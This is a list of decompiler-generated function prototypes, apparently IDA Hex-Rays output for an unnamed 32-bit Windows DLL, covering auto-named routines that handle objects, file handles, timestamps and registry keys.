// void __usercall sub_10012A5B(int a1@<esi>);
// void __usercall sub_10012A83(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10012AC6(int a1@<esi>);
_DWORD *__thiscall sub_10012AFE(_DWORD *Block, char a2);
// int __usercall sub_10012B30@<eax>(int a1@<esi>);
// int __usercall sub_10012B54@<eax>(int *a1@<esi>);
char __thiscall sub_10012C1C(_BYTE *this);
_DWORD *__thiscall sub_10012C3A(_DWORD *Block, char a2);
int __thiscall sub_10012C59(_DWORD *this);
// _DWORD *__usercall sub_10012C8B@<eax>(int *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__thiscall sub_10012CA0(_DWORD *Block, char a2);
int __thiscall sub_10012CBF(_DWORD *this);
int __stdcall sub_10012CF1(int a1);
int *__thiscall sub_10012D5E(int *Block, char a2);
void __thiscall sub_10012D7D(int *this);
_DWORD *__stdcall sub_10012DB0(int a1);
_DWORD *__thiscall sub_10012DD2(int this);
_DWORD *__thiscall sub_10012E7B(int this);
// int __usercall sub_10012EE3@<eax>(int a1@<esi>);
int __stdcall sub_10012F0D(int a1);
HANDLE *__thiscall sub_10012F6C(HANDLE *Block, char a2);
int __stdcall sub_10012F8B(int a1, int a2, _DWORD *a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes);
// void __userpurge sub_10012FD3(int a1@<esi>, _DWORD *a2, int a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes);
BOOL __thiscall sub_100130B8(HANDLE *this);
char __cdecl sub_10013103(int a1);
DWORD __thiscall sub_100131B7(int this);
char __thiscall sub_10013211(void *this, int pExceptionObject);
// char __userpurge sub_1001328F@<al>(int a1@<esi>, int pExceptionObject);
bool __thiscall sub_100132F8(_BYTE *this);
BOOL __thiscall sub_1001332B(HANDLE *this);
int __thiscall sub_10013358(_DWORD *this);
char __thiscall sub_1001335C(_BYTE *this);
int __stdcall sub_100133A7(int a1);
_DWORD *__thiscall sub_100133DC(_DWORD *Block, char a2);
void __thiscall sub_100133FB(_DWORD *this);
// int __usercall sub_10013422@<eax>(_DWORD *a1@<esi>);
void __cdecl sub_10013436(DWORD dwExitCode);
// int __userpurge sub_1001357D@<eax>(_DWORD *a1@<ebx>, int a2@<edi>, int a3);
void *__thiscall sub_100135C5(void *Block, char a2);
int __thiscall sub_100135E4(void *this, int a2, int a3);
void __thiscall sub_100136B9(int this);
void __fastcall sub_1001371F(int a1, int a2, int a3);
void __thiscall sub_10013D41(int this);
// int __userpurge sub_10013EAC@<eax>(int a1@<esi>, int a2, int pExceptionObject, char a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14);
// int __userpurge sub_10013F56@<eax>(int a1@<eax>, int pExceptionObject);
_DWORD *__stdcall sub_10013F8C(_DWORD *a1, int a2);
// int __userpurge sub_10013FD9@<eax>(int a1@<edi>, int a2);
void __cdecl sub_1001401E(int a1, int a2, int a3, int dwProcessId);
bool __cdecl sub_10014232(int a1, int a2);
int __stdcall sub_1001427F(int a1);
int __cdecl sub_100142C7(int a1, int a2, int a3);
// char __usercall sub_10014349@<al>(int a1@<eax>, int a2@<ecx>, DWORD dwProcessId);
// bool __usercall sub_10014380@<al>(char **a1@<esi>);
bool __cdecl sub_100145D0(WCHAR *a1, DWORD dwProcessId);
// char __usercall sub_1001475D@<al>(int a1@<eax>, int a2@<ecx>, DWORD dwProcessId);
// _DWORD *__usercall sub_100149AD@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_100149E8(void *this);
// void __usercall sub_10014A13(_DWORD *a1@<ecx>, int a2@<edi>);
// _DWORD *__usercall sub_10014A59@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10014A94(void *this);
// void __usercall sub_10014ABF(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10014B02(int a1@<esi>);
// void __usercall sub_10014B2A(int a1@<esi>);
int __stdcall sub_10014B52(int a1, void *a2, char a3);
_DWORD *__thiscall sub_10014BA3(_DWORD *Block, char a2);
int __stdcall sub_10014BC2(int a1, int a2);
bool __thiscall sub_10014C16(_DWORD *this);
_DWORD *__stdcall sub_10014C49(_DWORD *a1, void *a2, char a3);
void __thiscall sub_10014C9D(int *this);
void __stdcall sub_10014CC5(int a1, int a2, char pExceptionObject);
BOOL __thiscall sub_10014D29(_DWORD *this);
void __thiscall sub_10014D34(_DWORD *this, void *a2, int a3);
int __thiscall sub_10014DBF(_DWORD *this);
bool __stdcall sub_10014E39(int a1);
// bool __usercall sub_10014EB1@<al>(int a1@<eax>, int a2@<ecx>);
void __thiscall sub_10014EC9(HANDLE *this, HANDLE hSourceHandle, char a3, BOOL bInheritHandle, DWORD dwProcessId, DWORD a6);
_DWORD *__thiscall sub_10014F3E(_DWORD *this, _DWORD *a2);
void *__thiscall sub_10014F97(void *Block, char a2);
_DWORD *__stdcall sub_10014FB6(_DWORD *a1);
void __thiscall sub_1001500D(int this);
int __thiscall sub_10015086(int *this, _BYTE *a2);
size_t __thiscall sub_100150B6(_DWORD *this, _DWORD *a2);
unsigned int __thiscall sub_10015129(int *this, char a2);
int __thiscall sub_10015164(_DWORD *this, _DWORD *a2);
int __thiscall sub_100151BB(int *this, int a2);
int __thiscall sub_100151F1(_DWORD *this);
BOOL __thiscall sub_100151F8(void *this);
int __thiscall sub_10015203(_DWORD *this);
int __thiscall sub_10015207(_DWORD *this, int a2, int a3);
unsigned int __thiscall sub_10015252(_DWORD *this, void *a2);
char sub_100152D6();
int __thiscall sub_100152D9(_DWORD *this);
char sub_100152E1();
int __thiscall sub_100152E9(_DWORD *this, int a2, int a3);
void *__thiscall sub_100152F1(char *this, char a2);
_DWORD *__stdcall sub_100152F9(_DWORD *a1);
void __stdcall sub_10015325(_DWORD *a1);
// void __usercall sub_10015345(int a1@<esi>);
_DWORD *__stdcall sub_10015379(_DWORD *a1);
void __thiscall sub_100153B0(_DWORD *this);
void *__thiscall sub_10015407(void *this, int a2);
void *__thiscall sub_1001541C(void *this, int a2);
int __thiscall sub_10015431(_DWORD *this);
_DWORD *__thiscall sub_10015435(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1001548B(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100154E1(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10015537(int *this, _DWORD *a2);
void __thiscall sub_1001558D(_DWORD *this);
int *__thiscall sub_100155B2(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1001561A(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10015682(void *this, int a2);
void __thiscall sub_100156BA(void *this, int a2, int a3);
void __thiscall sub_100156F5(void *this, int a2);
int __thiscall sub_1001572D(void *this, int a2);
int __thiscall sub_10015769(void *this, int a2);
void __thiscall sub_100157A5(void *this);
_DWORD *__thiscall sub_100157F4(_DWORD *Block, char a2);
void *__stdcall sub_10015813(void *Block);
_DWORD *__thiscall sub_1001582E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001584D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001586D(_DWORD *Block, char a2);
void __stdcall sub_1001588D(int a1);
// void __usercall sub_100158AD(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10015909(_DWORD *a1);
// int __usercall sub_10015939@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10015978(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_100159B2(_DWORD *this);
BOOL __thiscall sub_100159D7(_DWORD *this);
BOOL __thiscall sub_100159E0(_DWORD *this);
int __thiscall sub_100159E9(_DWORD *this);
int __thiscall sub_10015A0D(_DWORD *this);
int __thiscall sub_10015A3A(_DWORD *this);
void *__thiscall sub_10015A67(int this);
_DWORD *__thiscall sub_10015ADD(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10015B62(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10015B9C(_DWORD *this);
BOOL __thiscall sub_10015BC1(_DWORD *this);
BOOL __thiscall sub_10015BCA(_DWORD *this);
int __thiscall sub_10015BD3(_DWORD *this);
int __thiscall sub_10015BF7(_DWORD *this);
int __thiscall sub_10015C24(_DWORD *this);
void *__thiscall sub_10015C51(int this);
_DWORD *__thiscall sub_10015CC7(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10015D4C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10015D6B(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10015D9F(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7);
// _DWORD *__userpurge sub_10015DFF@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10015E3E(void *this);
// _DWORD *__userpurge sub_10015E83@<eax>(_DWORD *a1@<esi>, int a2);
// void __usercall sub_10015ED4(int a1@<esi>);
_DWORD *__stdcall sub_10015F22(_DWORD *a1, int a2, int a3);
int *__thiscall sub_10015F65(int *Block, char a2);
void __thiscall sub_10015F84(int *this);
char __thiscall sub_10015FB7(_DWORD **this);
// _DWORD *__usercall sub_100160AB@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_100160C2(_DWORD *Block, char a2);
UINT __thiscall sub_100160E1(_DWORD *this);
_DWORD *__stdcall sub_10016114(_DWORD *a1, int a2);
_DWORD *__thiscall sub_10016147(_DWORD *Block, char a2);
void __thiscall sub_10016166(_DWORD *this);
int __stdcall sub_1001618A(int *a1);
_DWORD *__stdcall sub_100161E5(int *a1, _DWORD *a2);
void __thiscall sub_10016222(int *this, char a2, int a3);
_DWORD *__stdcall sub_10016305(_DWORD *a1);
void __thiscall sub_1001633C(_DWORD *this);
void *__thiscall sub_10016393(void *this, int a2);
void *__thiscall sub_100163A8(void *this, int a2);
int __thiscall sub_100163BD(_DWORD *this);
_DWORD *__thiscall sub_100163C1(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10016417(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1001646D(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100164C3(int *this, _DWORD *a2);
void __thiscall sub_10016519(_DWORD *this);
int *__thiscall sub_1001653E(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100165A6(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1001660E(void *this, int a2, int a3);
void __thiscall sub_10016649(void *this, int a2);
int __thiscall sub_10016681(void *this, int a2);
int __thiscall sub_100166BD(void *this, int a2);
void __thiscall sub_100166F9(void *this);
// int __usercall sub_10016746@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1001677E(_DWORD *Block, char a2);
void *__stdcall sub_1001679D(void *Block);
_DWORD *__thiscall sub_100167B8(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100167D7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100167F7(_DWORD *Block, char a2);
int __stdcall sub_10016817(int a1);
// void __usercall sub_10016837(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10016893(_DWORD *a1);
// int __usercall sub_100168C8@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100168F9(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10016933(_DWORD *this);
BOOL __thiscall sub_10016958(_DWORD *this);
BOOL __thiscall sub_10016961(_DWORD *this);
int __thiscall sub_1001696A(_DWORD *this);
int __thiscall sub_1001698E(_DWORD *this);
int __thiscall sub_100169BB(_DWORD *this);
void *__thiscall sub_100169E8(int this);
_DWORD *__thiscall sub_10016A5E(_DWORD *this, int *a2);
_DWORD *__thiscall sub_10016AED(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10016B27(_DWORD *this);
BOOL __thiscall sub_10016B4C(_DWORD *this);
BOOL __thiscall sub_10016B55(_DWORD *this);
int __thiscall sub_10016B5E(_DWORD *this);
int __thiscall sub_10016B82(_DWORD *this);
int __thiscall sub_10016BAF(_DWORD *this);
void *__thiscall sub_10016BDC(int this);
_DWORD *__thiscall sub_10016C52(_DWORD *this, int *a2);
_DWORD *__thiscall sub_10016CE1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10016D00(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10016D34(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
// _DWORD *__userpurge sub_10016D87@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
// _DWORD *__userpurge sub_10016DE9@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_10016E56@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10016E95(void *this);
// void __usercall sub_10016EFC(int a1@<esi>);
void __thiscall __noreturn sub_10016F42(void *this);
// _DWORD *__usercall sub_10016F8F@<eax>(_DWORD *a1@<esi>);
void *__thiscall sub_10016FB1(void *Block, char a2);
int __thiscall sub_10016FD0(void *this);
int __stdcall sub_1001700E(int a1, int a2, _DWORD *a3, int a4, int a5, int a6, volatile LONG *lpAddend);
HANDLE *__thiscall sub_10017093(HANDLE *Block, char a2);
int __stdcall sub_100170B2(int a1, int a2, _DWORD *a3, int a4, volatile LONG *lpAddend);
// int __userpurge sub_10017136@<eax>(int a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend);
int __thiscall sub_100171A0(int this, int a2);
void __thiscall sub_100171E7(HANDLE *this);
void __thiscall sub_10017229(void *this);
void __thiscall sub_10017404(_DWORD *this);
_DWORD *__thiscall sub_10017417(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_1001748D(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1001751D(_DWORD *this, char a2);
char *__thiscall sub_1001753F(_DWORD *this, char a2);
void __thiscall sub_10017561(_DWORD *this);
int __thiscall sub_10017574(HANDLE *this);
int __thiscall sub_10017584(HANDLE *this, const FILETIME *a2, int a3);
int __thiscall sub_100175CE(HANDLE *this, const FILETIME *a2, int a3);
int __thiscall sub_10017618(_DWORD *this);
BOOL __thiscall sub_1001764D(_DWORD *this);
int __thiscall sub_1001765C(void *this, char a2);
int __thiscall sub_10017676(HANDLE *this, _DWORD *NumberOfBytesWritten);
int __thiscall sub_10017690(HANDLE *this);
int __thiscall sub_100176D0(_DWORD *this, int a2, int a3, int a4, void *Block, _DWORD **a6, _DWORD *a7, volatile LONG *lpAddend);
int __thiscall sub_10017870(int this);
int __thiscall sub_10017897(int this);
int __thiscall sub_100178BE(int this);
unsigned int __thiscall sub_100178EA(_BYTE *this);
int __thiscall sub_1001792E(int this);
int __thiscall sub_1001795A(int this, unsigned int a2);
char __thiscall sub_100179B5(_BYTE *this);
int __thiscall sub_100179B9(int *this, volatile LONG *a2);
DWORD __thiscall sub_10017A6B(int this);
// void __usercall sub_10017A84(int a1@<esi>);
int *__thiscall sub_10017B3D(void *this, int *a2);
int *__cdecl sub_10017B71(int *a1, int a2);
// void __usercall sub_10017BCF(_DWORD *a1@<ecx>, int a2@<edi>);
// _DWORD *__userpurge sub_10017C15@<eax>(int a1@<ebx>, int a2@<edi>, _DWORD *a3, int a4, int a5, int a6, int a7, volatile LONG *lpAddend);
void *__thiscall sub_10017CD6(void *Block, char a2);
// _DWORD *__userpurge sub_10017CF5@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
void __thiscall sub_10017D5E(int this);
char __thiscall sub_10017DBD(_DWORD *this);
void __thiscall sub_10017E88(_DWORD *this);
_DWORD *__thiscall sub_10017E9B(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_10017F11(_DWORD *this, char a2);
int __thiscall sub_10017F33(HANDLE *this);
BOOL __thiscall sub_10017F73(_DWORD *this);
int __thiscall sub_10017F7D(_DWORD *this);
char *__thiscall sub_10017F81(char *this);
int *__thiscall sub_10017F85(_DWORD *this, int *a2);
int __thiscall sub_10018031(_DWORD *this);
_DWORD *__thiscall sub_10018035(_DWORD *this, _DWORD *a2);
int __thiscall sub_10018071(_DWORD *this);
int __thiscall sub_10018075(_DWORD *this);
int __thiscall sub_10018079(_DWORD *this);
// int __userpurge sub_1001807D@<eax>(HANDLE *a1@<esi>, FILETIME *lpCreationTime, FILETIME *lpLastAccessTime, FILETIME *lpLastWriteTime);
_QWORD *__thiscall sub_100180DF(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_10018120(HANDLE *this, const FILETIME *a2, int a3);
_QWORD *__thiscall sub_10018172(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_100181B5(HANDLE *this, const FILETIME *a2, int a3);
_QWORD *__thiscall sub_10018205(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_10018246(HANDLE *this, const FILETIME *a2, int a3);
DWORD __thiscall sub_10018298(HANDLE *this);
BOOL __thiscall sub_10018367(void *this, DWORD dwFileAttributes);
DWORD __thiscall sub_100183BB(HANDLE *this);
// BOOL __userpurge sub_1001847C@<eax>(struct _FILETIME *a1@<ebx>, struct _FILETIME *a2@<edi>, HANDLE *a3@<esi>, struct _FILETIME *a4);
// struct _FILETIME __usercall sub_1001856E@<edx:eax>(const FILETIME *a1@<eax>, int a2, int a3);
__int16 __thiscall sub_100185DD(void *this);
int __thiscall sub_1001863B(HANDLE *this, _DWORD *NumberOfBytesRead);
void __thiscall sub_100186CD(_DWORD *this);
_DWORD *__thiscall sub_100186E0(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_10018756(_DWORD *this, char a2);
LONG __thiscall sub_10018778(void *this, char a2);
int __thiscall sub_100187B9(HANDLE *this, _DWORD *NumberOfBytesWritten);
DWORD __thiscall sub_1001882C(HANDLE *this, LONG lDistanceToMove, DWORD dwMoveMethod);
void __thiscall sub_1001889C(_DWORD *this);
_DWORD *__thiscall sub_100188AF(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_10018925(_DWORD *this, char a2);
DWORD __thiscall sub_10018947(HANDLE *this);
BOOL __thiscall sub_10018999(HANDLE *this);
BOOL __thiscall sub_100189E4(HANDLE *this);
// int __usercall sub_10018A2F@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_10018A5A(_DWORD *Block, char a2);
_DWORD *__cdecl sub_10018A88(_DWORD *a1);
_DWORD *__cdecl sub_10018B3B(_DWORD *a1);
// _DWORD *__usercall sub_10018BA1@<eax>(int a1@<esi>);
void __thiscall sub_10018BEB(_DWORD *this);
_DWORD *__cdecl sub_10018C2A(_DWORD *a1);
// _DWORD *__userpurge sub_10018C5B@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_10018C9A(_DWORD *a1);
_DWORD *__thiscall sub_10018CC5(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10018CEB(_DWORD *Block, char a2);
void __thiscall sub_10018D0B(_DWORD *this);
int __thiscall sub_10018D30(void *this, int a2);
_DWORD *__stdcall sub_10018EE4(_DWORD *a1);
void __thiscall sub_10018F6F(_DWORD *this);
// int __userpurge sub_10018FB6@<eax>(int a1@<esi>, int a2);
// _DWORD *__userpurge sub_10018FEF@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_10019034@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_10019079(_DWORD *a1);
_DWORD *__thiscall sub_100190A6(_DWORD *Block, char a2);
void __thiscall sub_100190C5(_DWORD *this);
int sub_100190E9();
int __stdcall sub_100190ED(int *a1);
_DWORD *__stdcall sub_10019177(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100191DE(_DWORD *Block, char a2);
char __thiscall sub_100191FD(_DWORD *this);
LONG __thiscall sub_10019241(int this, int a2);
_DWORD *__stdcall sub_10019322(_DWORD *a1);
char __stdcall sub_100193A0(int a1, _DWORD *cy);
// _DWORD *__userpurge sub_10019515@<eax>(int a1@<esi>, _DWORD *a2);
LONG __thiscall sub_10019606(_DWORD *this);
char __thiscall sub_10019719(_DWORD *this);
char __thiscall sub_1001974A(_DWORD *this);
// char __usercall sub_1001977B@<al>(int a1@<eax>, int a2@<edi>);
char __thiscall sub_100197B0(_DWORD *this);
// char __usercall sub_100197E1@<al>(int a1@<eax>, int a2@<edi>);
_DWORD *__thiscall sub_10019816(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10019835(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10019854(_DWORD *Block, char a2);
// char __usercall sub_10019873@<al>(int a1@<esi>);
// char __usercall sub_1001988D@<al>(int a1@<esi>);
// char __usercall sub_100198A6@<al>(int a1@<esi>);
// BOOL __usercall sub_100198BF@<eax>(int a1@<eax>);
// BOOL __usercall sub_100198D2@<eax>(int a1@<eax>);
// BOOL __usercall sub_100198E5@<eax>(int a1@<eax>);
char sub_10019969();
char sub_100199C0();
_DWORD *__stdcall sub_10019AD5(_DWORD *a1);
DWORD sub_10019C25();
_DWORD *__stdcall sub_10019D5C(_DWORD *a1);
void *__thiscall sub_10019DA0(void *Block, char a2);
int __thiscall sub_10019DBF(int this);
unsigned int __thiscall sub_10019E17(_DWORD *this, char a2);
int __thiscall sub_10019E4F(_DWORD *this, _DWORD *a2);
int __thiscall sub_10019EAB(int *this, int a2);
int __thiscall sub_10019EE1(_DWORD *this);
int __thiscall sub_10019EE5(_DWORD *this, int a2, int a3);
char *__thiscall sub_10019F30(_DWORD *this, char *a2);
LONG __thiscall sub_10019F87(_DWORD *this);
char sub_10019FE9();
int __stdcall sub_10019FEC(int a1);
_BYTE *__thiscall sub_1001A01B(_BYTE *Block, char a2);
int __thiscall sub_1001A03A(_BYTE *this);
int __thiscall sub_1001A081(_BYTE *this);
char __thiscall sub_1001A094(_BYTE *this);
int __thiscall sub_1001A098(void *this, _DWORD *a2);
void __cdecl sub_1001A0E1(int a1, int a2);
int *__cdecl sub_1001A1AE(int *a1, int a2);
int *__cdecl sub_1001A232(int *a1, int a2);
int *__cdecl sub_1001A2B6(int *a1, int a2);
// bool __usercall sub_1001A327@<al>(int a1@<eax>);
bool __cdecl sub_1001A33E(int a1);
void __cdecl sub_1001A401(int a1, int a2);
int __cdecl sub_1001A50B(int a1, unsigned int lDistanceToMove, void *a3);
int *__cdecl sub_1001A649(int *a1, int a2, _ThrowInfo *a3);
_DWORD *__thiscall sub_1001A8AC(_DWORD *this, int a2);
// DWORD __usercall sub_1001A942@<eax>(int a1@<esi>);
int sub_1001A9B1();
void __cdecl sub_1001AA62(int a1);
DWORD __cdecl sub_1001AAFA(int a1);
void __thiscall sub_1001ABDE(_DWORD *this);
_DWORD *__thiscall sub_1001ABF1(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1001AC67(_DWORD *this, char a2);
void __thiscall sub_1001AD09(_DWORD *this);
_DWORD *__thiscall sub_1001AD1C(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1001AD92(_DWORD *this, char a2);
// _DWORD *__usercall sub_1001ADC1@<eax>(int a1@<edi>, _DWORD *a2, int a3);
// void *__usercall sub_1001AE59@<eax>(int a1@<ecx>, _DWORD *a2@<esi>);
// HANDLE __usercall sub_1001AE98@<eax>(int a1@<ecx>, int a2@<ebx>);
// HANDLE __usercall sub_1001AF3E@<eax>(int a1@<ecx>, int a2@<ebx>, int a3);
_DWORD *__cdecl sub_1001AFED(_DWORD *a1, int a2);
void __cdecl sub_1001B08F(int a1);
bool __cdecl sub_1001B1FC(int a1);
bool __thiscall sub_1001B2B0(_DWORD *this);
// char __usercall sub_1001B2E1@<al>(int a1@<eax>, int a2@<edi>);
void __thiscall sub_1001B316(void *this);
// _DWORD *__usercall sub_1001B341@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__thiscall sub_1001B36C(_DWORD *Block, char a2);
// bool __usercall sub_1001B38B@<al>(int a1@<esi>);
// void __usercall sub_1001B3B7(int a1@<esi>);
// BOOL __usercall sub_1001B3DF@<eax>(int a1@<eax>);
_DWORD *__stdcall sub_1001B3FC(_DWORD *a1, int a2, char a3);
_BYTE *__thiscall sub_1001B42F(_BYTE *Block, char a2);
int __thiscall sub_1001B44E(_BYTE *this);
void *__thiscall sub_1001B490(void *this, int a2);
_DWORD *__thiscall sub_1001B4A5(_DWORD *this, char a2);
void *__thiscall sub_1001B4C1(void *this, char a2);
void *__thiscall sub_1001B4DB(void *this, char a2);
void *__thiscall sub_1001B4F5(void *this, char a2, int a3);
void *__thiscall sub_1001B50F(void *this, char a2, int a3);
void *__thiscall sub_1001B529(void *this, int a2, int a3);
void *__thiscall sub_1001B581(void *this, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_1001B5C3(void *this, int a2, unsigned int a3);
char sub_1001B5F3();
int __stdcall sub_1001B5F6(int a1, int a2, char a3);
_BYTE *__thiscall sub_1001B62F(_BYTE *Block, char a2);
int __thiscall sub_1001B64E(_BYTE *this);
int __thiscall sub_1001B690(_BYTE *this);
int __thiscall sub_1001B6C1(void *this);
int __thiscall sub_1001B6D8(void *this);
int __thiscall sub_1001B6E8(void *this);
int __thiscall sub_1001B6F8(_DWORD *this);
BOOL __thiscall sub_1001B6FD(void *this);
int __thiscall sub_1001B724(void *this);
int __thiscall sub_1001B75D(void *this, int a2, int a3);
int __stdcall sub_1001B79E(int a1, int a2);
_BYTE *__thiscall sub_1001B82D(_BYTE *Block, char a2);
int __stdcall sub_1001B84C(int, int, volatile LONG *lpAddend); // idb
int __thiscall sub_1001B8BA(_BYTE *this);
int __thiscall sub_1001B912(_DWORD **this);
int __thiscall sub_1001B91E(_DWORD **this);
int __thiscall sub_1001B92A(_DWORD **this);
int __thiscall sub_1001B932(int this);
int __thiscall sub_1001B956(_DWORD **this);
int __thiscall sub_1001B95E(_DWORD **this, int a2, int a3);
char sub_1001B988();
int __stdcall sub_1001B98B(int a1, int a2, int a3, int a4, char a5);
void *__thiscall sub_1001B9E2(void *Block, char a2);
int __stdcall sub_1001BA01(int a1, int a2, int a3);
int __thiscall sub_1001BA54(int this);
int __thiscall sub_1001BAAC(char *this, char a2);
int __thiscall sub_1001BAD2(_BYTE *this);
unsigned int __thiscall sub_1001BAE5(void *this, int *a2);
LONG __thiscall sub_1001BC24(_DWORD **this, int *a2);
LONG __thiscall sub_1001BCF4(_DWORD **this);
char sub_1001BD8D();
int __stdcall sub_1001BD90(int a1);
_BYTE *__thiscall sub_1001BDEB(_BYTE *Block, char a2);
void __thiscall sub_1001BE0A(_BYTE *this);
int __thiscall sub_1001BE69(_BYTE *this, int a2, _DWORD *a3);
_DWORD *__stdcall sub_1001BEDE(_DWORD *a1);
_DWORD *__thiscall sub_1001BF0C(_DWORD *Block, char a2);
void __thiscall sub_1001BF2B(_DWORD *this);
_DWORD *__stdcall sub_1001BF4F(_DWORD *a1, int a2, int a3);
_BYTE *__thiscall sub_1001BF8B(_BYTE *Block, char a2);
int __thiscall sub_1001BFAA(_BYTE *this);
int __thiscall sub_1001BFEC(_DWORD *this, int pExceptionObject);
int __thiscall sub_1001C08E(_DWORD *this, int pExceptionObject);
char sub_1001C108();
_DWORD *__stdcall sub_1001C10B(_DWORD *a1, int pExceptionObject, int a3);
int *__thiscall sub_1001C191(int *Block, char a2);
_DWORD *__thiscall sub_1001C212(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001C231(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1001C250(_DWORD *a1, int a2);
void __thiscall sub_1001C2B3(int *this);
// BOOL __usercall sub_1001C2E8@<eax>(int a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_1001C33C(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1001C371(int a1, _DWORD *a2);
int __thiscall sub_1001C3A6(void *this, int a2);
int __thiscall sub_1001C3F4(void *this);
_DWORD *__thiscall sub_1001C4C8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001C55A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001C5ED(void *this, _DWORD *a2);
LONG __thiscall sub_1001C6B1(void *this, int a2);
LONG __thiscall sub_1001C71A(void *this, int a2);
LONG __thiscall sub_1001C783(void *this, int a2);
LONG __thiscall sub_1001C7EC(void *this, int a2);
int __thiscall sub_1001C857(void *this);
_DWORD *__thiscall sub_1001C8A8(_DWORD *Block, char a2);
int __stdcall sub_1001C8D7(int a1, int a2);
_DWORD *__thiscall sub_1001C917(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001C93E(_DWORD *this, _DWORD *a2);
int __stdcall sub_1001C9AA(int a1, int a2);
_DWORD *__thiscall sub_1001C9F5(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001CA1C(int *this, _DWORD *a2);
// int __userpurge sub_1001CB65@<eax>(int a1@<edi>, int a2);
_DWORD *__thiscall sub_1001CC37(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1001CC57(_DWORD *a1);
_DWORD *__thiscall sub_1001CC89(_DWORD *Block, char a2);
void __thiscall sub_1001CCA8(_DWORD *this);
char __thiscall sub_1001CCCD(void *this, HKEY a2);
HKEY __stdcall sub_1001CE7E(int a1, HKEY a2);
// HKEY __usercall sub_1001CFDC@<eax>(HKEY result@<eax>, int a2@<ecx>);
void __thiscall sub_1001D042(void *this, HKEY a2);
char __stdcall sub_1001D1AF(HKEY phkResult);
void __thiscall sub_1001D28F(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex);
DWORD __thiscall sub_1001D374(void *this, HKEY a2);
char __thiscall sub_1001D445(void *this, HKEY a2, int a3);
_DWORD *__thiscall sub_1001D526(void *this, _DWORD *a2, HKEY a3, int pExceptionObject, DWORD *a5);
char __thiscall sub_1001D62D(void *this, HKEY a2, int a3, _DWORD *a4, DWORD dwType);
char __thiscall sub_1001D6EB(void *this, HKEY a2, int a3);
void __thiscall sub_1001D7CE(void *this, void *a2, HKEY a3, DWORD dwIndex);
DWORD __thiscall sub_1001D8C9(void *this, HKEY a2);
unsigned int __stdcall sub_1001D995(HKEY phkResult);
